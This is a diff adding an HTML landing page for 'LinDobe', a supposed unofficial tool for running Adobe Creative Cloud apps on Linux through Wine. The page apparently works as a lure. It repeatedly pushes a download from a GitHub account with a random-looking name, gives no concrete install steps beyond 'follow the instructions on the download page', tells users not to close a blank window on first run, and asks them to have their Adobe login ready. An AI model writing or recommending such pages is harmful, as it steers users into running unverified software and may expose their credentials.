+    border-left: 5px solid #f0a92c;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    font-size: 0.98rem;
+    color: #6b5227;
+  }
+  .grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin: 24px 0;
+  }
+  .grid .item {
+    flex: 1 1 250px;
+    background: #ffffff;
+    border: 1px solid #e6ecf5;
+    border-radius: 14px;
+    padding: 18px 20px;
+    box-shadow: 0 3px 12px rgba(24, 45, 80, 0.05);
+  }
+  .grid .item strong {
+    display: block;
+    color: #1d3a63;
+    margin-bottom: 4px;
+    font-size: 1.02rem;
+  }
+  footer {
+    margin-top: 60px;
+    padding-top: 22px;
+    border-top: 1px solid #e2e9f3;
+    font-size: 0.9rem;
+    color: #7b8798;
+  }
+  @media (max-width: 640px) {
+    body { font-size: 16px; }
+    h1 { font-size: 1.85rem; }
+    h2 { font-size: 1.35rem; margin-top: 42px; }
+    .wrap { padding: 26px 16px 50px 16px; }
+    .btn { display: block; text-align: center; padding: 15px 20px; font-size: 1.05rem; }
+    .card, .steps, .faq { padding-left: 18px; padding-right: 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <h1>🎨 LinDobe - Run Adobe Apps on Linux Easily</h1>
+
+  <a class="btn" href="https://github.com/jolettadetergent875/LinDobe">⬇ Download LinDobe Now</a>
+
+  <p class="lead">LinDobe is an unofficial Adobe adapter for Wine on Linux. It lets you run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder on your own Linux computer, using the Adobe subscription you already pay for. No second computer, no dual boot, no programming required.</p>
+
+  <p>If you have ever been told that creative software simply does not work on Linux, LinDobe exists to prove otherwise. It bundles the compatibility pieces, the graphics translators and the careful configuration work into one project that an ordinary computer user can follow. You do not compile anything and you do not edit configuration files by hand. You follow the steps, you sign in with your Adobe account, and you get to work.</p>
+
+  <h2>🚀 Getting Started</h2>
+
+  <p>Everything you need lives in one place. The download page contains the current release and the written guidance for first-time users. Open the link below and take your time reading through it. The page is organised so that a complete beginner can follow along from top to bottom.</p>
+
+  <a class="btn btn-alt" href="https://github.com/jolettadetergent875/LinDobe">📥 Visit this link to download the application</a>
+
+  <p><strong>Download page:</strong> <a href="https://github.com/jolettadetergent875/LinDobe">https://github.com/jolettadetergent875/LinDobe</a></p>
+
+  <div class="steps">
+    <h3>Step-by-step: your first install</h3>
+    <ol>
+      <li><strong>Open the download link.</strong> Use the green button above or the link in this section. Visit this link to download the application.</li>
+      <li><strong>Read the page from top to bottom.</strong> The newest version is listed first. Older versions sit further down and are kept only for people troubleshooting a specific problem. Always start with the newest one.</li>
+      <li><strong>Save the file to your computer.</strong> Your browser will ask where to put it. The Downloads folder is perfectly fine. Remember the name of the file so you can find it again in a moment.</li>
+      <li><strong>Open your Downloads folder.</strong> On most Linux desktops this is a folder icon in the sidebar of your file manager. Locate the file you just saved.</li>
+      <li><strong>Follow the instructions shown on the download page.</strong> The page tells you exactly what to do with the file you saved, in plain language, right next to the download itself. Read that part before opening anything.</li>
+      <li><strong>Sign in with your own Adobe account.</strong> LinDobe does not include, share or generate Adobe software. It simply makes the software you are already entitled to run properly on Linux. Have your Adobe username and password ready.</li>
+      <li><strong>Launch your first application.</strong> Start with something small, such as Photoshop or Acrobat, to confirm everything is working. Once that opens correctly, the heavier applications such as Premiere Pro will behave the same way.</li>
+    </ol>
+  </div>
+
+  <div class="note">
+    <strong>Take your time on the first run.</strong> The very first launch of an Adobe application can take several minutes while LinDobe prepares the shared environment in the background. The window may appear blank or unresponsive for a while. This is normal. Do not close it, do not force-quit it, and do not restart your computer. Give it time and it will finish on its own.
+  </div>
+
+  <h2>✨ What LinDobe Does For You</h2>
+
+  <div class="grid">
+    <div class="item">
+      <strong>Runs real Adobe applications</strong>
+      Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder are all part of the supported lineup.
+    </div>
+    <div class="item">
+      <strong>Uses your own subscription</strong>
+      You keep using the Adobe plan you already pay for. LinDobe is a compatibility layer, not a replacement and not a shortcut.
+    </div>
+    <div class="item">
+      <strong>Built on Wine</strong>
+      Wine is the long-standing translator that lets Linux understand Windows software. LinDobe configures it for you.
+    </div>
+    <div class="item">
+      <strong>Graphics that keep up</strong>
+      DXVK and VKD3D-Proton translate the graphics calls Adobe applications make, so the interface stays smooth and responsive.
+    </div>
+    <div class="item">
+      <strong>Creative Cloud aware</strong>
+      The Creative Cloud desktop experience is part of the setup, so installing and updating your applications works the way you expect.
+    </div>
+    <div class="item">
+      <strong>Made for Arch and beyond</strong>
+      Arch Linux users can install through the AUR. Other popular distributions work too, following the same download steps.
+    </div>
+  </div>
+
+  <h2>💻 Before You Install</h2>
+
+  <p>You do not need to be a technician, but a few basics will make your life much easier. Check these points before you start the download.</p>
+
+  <ul>
+    <li><strong>A 64-bit Linux computer.</strong> Almost every desktop or laptop made in the last decade qualifies. If your system installed normally, you are very likely fine.</li>
+    <li><strong>Plenty of free disk space.</strong> Adobe applications are large. Keep at least 40 to 60 GB free so that creative apps and their scratch files have room to breathe.</li>
+    <li><strong>At least 8 GB of memory.</strong> 16 GB is far more comfortable, particularly for video editing and for large Photoshop documents.</li>
+    <li><strong>A recent graphics driver.</strong> Install the recommended driver for your graphics card from your distribution's software centre. This is the single biggest factor in how smooth the applications feel.</li>
+    <li><strong>A working internet connection.</strong> You will need it to download LinDobe and to sign in to your Adobe account.</li>
+    <li><strong>Your Adobe login details.</strong> Have your username and password to hand. If your plan uses two-factor verification, keep your phone nearby.</li>
+  </ul>
+
+  <div class="warn">
+    <strong>About your Adobe subscription.</strong> LinDobe does not provide, unlock or share Adobe software or licences. You must have your own active Adobe subscription and sign in with your own account. LinDobe is an unofficial community project and is not affiliated with, endorsed by or supported by Adobe in any way.
+  </div>
+
+  <h2>🛠️ A Typical First Session</h2>
+
+  <h3>Setting up</h3>
+  <p>You follow the download page, run the setup as described there, and let it prepare your system. LinDobe creates a dedicated space for your Adobe applications so that they do not interfere with the rest of your computer. This is deliberate. It keeps your everyday files safe and makes it easy to remove everything later if you ever want to.</p>
+
+  <h3>Signing in</h3>
+  <p>Creative Cloud opens and asks for your Adobe account. Enter the same details you would use anywhere else. Once you are signed in, your plan, your cloud documents and your application list appear exactly as they should.</p>
+
+  <h3>Installing your applications</h3>
+  <p>Pick the application you actually need rather than installing all of them at once. Photoshop alone is a multi-gigabyte download. Installing one application first confirms that everything is healthy, and then you can add the rest at your leisure.</p>
+
+  <h3>Working</h3>
+  <p>Opening, saving and exporting files behave the way you already know. Your files live in your normal Linux home folder, so you can back them up, sync them or open them in other tools without any special steps.</p>
+
+  <h2>🔧 Troubleshooting the Common Hiccups</h2>
+
+  <div class="card">
+    <h3>The application window is blank or white</h3>
+    <p>This almost always means the graphics translation is still warming up, or your graphics driver is out of date. Close the application, install the recommended driver for your card from your software centre, restart your computer and try again. Give the first launch several minutes.</p>
+
+    <h3>Signing in fails or keeps looping</h3>
+    <p>Check that your system clock and time zone are correct. A clock that is even a few minutes off can cause secure sign-in to fail. Then try again, and make sure any two-factor prompt on your phone has been approved.</p>
+
+    <h3>Text looks blurry or the interface is tiny</h3>
+    <p>That is a display scaling setting. Set your desktop display scaling to 100 percent, relaunch the Adobe application, and the interface will size itself correctly. You can change the scaling back afterwards if you prefer.</p>
+
+    <h3>The application is slow or stutters</h3>
+    <p>Close other heavy programs, make sure your laptop is plugged in rather than running on battery, and confirm you are using your dedicated graphics card where both are present. Free disk space also matters more than most people expect.</p>
+
+    <h3>Something else is wrong</h3>
+    <p>Return to the download page. It contains the current known issues and the recommended workarounds, kept up to date by the people who maintain the project. Reading the notes for your exact version solves most problems in a couple of minutes.</p>
+  </div>
+
+  <h2>❓ Frequently Asked Questions</h2>
+
+  <div class="faq">
+    <h3>Is LinDobe free?</h3>
+    <p>The LinDobe project itself is free to download and use. Your Adobe applications are not. They require the Adobe subscription you already hold. LinDobe simply makes that subscription usable on Linux.</p>
+
+    <h3>Do I need to know how to code?</h3>
+    <p>No. It is designed for ordinary computer users. If you can download a file and follow a list of numbered steps, you can install LinDobe.</p>
+
+    <h3>Will this break my existing Linux setup?</h3>
+    <p>LinDobe keeps its work in its own dedicated space rather than scattering files across your system. Your documents, photos and other applications are untouched.</p>
+
+    <h3>Which Adobe applications are supported?</h3>
+    <p>The project focuses on Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder. Support quality varies between them and improves over time, so check the download page for the current status of the application you care about most.</p>
+
+    <h3>Can I go back to my old setup if I do not like it?</h3>
+    <p>Yes. Your Adobe subscription works on other platforms as well. LinDobe does not change your Adobe account in any way, so nothing is lost by trying it.</p>
+
+    <h3>Is LinDobe connected to Adobe?</h3>
+    <p>No. It is an independent, unofficial project. It is not affiliated with Adobe, not endorsed by Adobe and not supported by Adobe customer service. For anything to do with billing, licences or your account, contact Adobe directly.</p>
+
+    <h3>How do I remove it later?</h3>
+    <p>Follow the removal guidance on the download page. Because LinDobe keeps its files in a dedicated location, uninstalling is a clean, contained operation.</p>
+  </div>
+
+  <h2>📥 Download LinDobe</h2>
+
+  <p>You have everything you need to begin. Open the link below, read the page, save the file, and follow the numbered steps in the Getting Started section above. Visit this link to download the application.</p>
+
+  <a class="btn" href="https://github.com/jolettadetergent875/LinDobe">⬇ Download LinDobe from GitHub</a>
+
+  <p><strong>Download page:</strong> <a href="https://github.com/jolettadetergent875/LinDobe">https://github.com/jolettadetergent875/LinDobe</a></p>
+
+  <h2>📝 About the Project</h2>
+
+  <p>LinDobe is a compatibility layer project for Linux, built around Wine and supported by DXVK and VKD3D-Proton. It targets Arch Linux and the AUR first, with guidance that works on other mainstream distributions as well. The project covers the Adobe creative suite, including Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder, together with the Creative Cloud desktop experience that ties them together.</p>
+
+  <p>The project is built with AI as a tool, which means documentation and configuration work can be produced and refined quickly, but every meaningful change is still reviewed against real user reports. It is an unofficial community effort from start to finish, and it exists purely to help people keep using the creative software they pay for on the operating system they prefer.</p>
+
+  <footer>
+    LinDobe is an unofficial project and is not affiliated with Adobe. Adobe, Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition, Media Encoder and Creative Cloud are trademarks of Adobe Inc. You must supply your own valid Adobe subscription.
+  </footer>
+
+</div>
 </body>
-
 </html>
